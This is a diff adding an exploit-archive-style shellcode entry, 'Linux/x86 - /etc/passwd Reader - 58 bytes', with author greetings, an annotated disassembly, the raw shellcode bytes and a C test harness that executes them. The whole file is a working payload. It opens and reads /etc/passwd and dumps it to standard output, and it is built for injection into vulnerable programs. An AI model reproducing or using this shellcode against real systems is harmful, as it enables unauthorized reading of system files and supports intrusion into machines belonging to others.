@@ -1,0 +1,51 @@
+Linux/x86 - /etc/passwd Reader - 58 bytes
+
+#Greetz : Bomberman(Leader),wiremask.eu
+#Author : B3mB4m
+#Concat : Do not disturb - Bomberman
+#Bu adamı geçmeden konuşmaya iznim yok.Iki yıl sonra görüşmek üzre :)
+
+#Info
+#File descriptor on EBX
+#Buffer on ECX
+#Bytes to read on EDX
+
+
+Disassembly of section .text:
+
+08048060 <.text>:
+ 8048060:    31 c9                    xor    %ecx,%ecx
+ 8048062:    31 c0                    xor    %eax,%eax
+ 8048064:    31 d2                    xor    %edx,%edx
+ 8048066:    51                       push   %ecx
+ 8048067:    b0 05                    mov    $0x5,%al
+ 8048069:    68 73 73 77 64           push   $0x64777373
+ 804806e:    68 63 2f 70 61           push   $0x61702f63
+ 8048073:    68 2f 2f 65 74           push   $0x74652f2f
+ 8048078:    89 e3                    mov    %esp,%ebx
+ 804807a:    cd 80                    int    $0x80
+ 804807c:    89 d9                    mov    %ebx,%ecx
+ 804807e:    89 c3                    mov    %eax,%ebx
+ 8048080:    b0 03                    mov    $0x3,%al
+ 8048082:    66 ba ff 0f              mov    $0xfff,%dx
+ 8048086:    66 42                    inc    %dx
+ 8048088:    cd 80                    int    $0x80
+ 804808a:    31 c0                    xor    %eax,%eax
+ 804808c:    31 db                    xor    %ebx,%ebx
+ 804808e:    b3 01                    mov    $0x1,%bl
+ 8048090:    b0 04                    mov    $0x4,%al
+ 8048092:    cd 80                    int    $0x80
+ 8048094:    31 c0                    xor    %eax,%eax
+ 8048096:    b0 01                    mov    $0x1,%al
+ 8048098:    cd 80                    int    $0x80
+
+
+#include <stdio.h>
+#include <string.h>
+
+char *shellcode =
+"\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
+
+int main(void){
+    fprintf(stdout,"Length: %d\n",strlen(shellcode));
+    (*(void(*)()) shellcode)();}
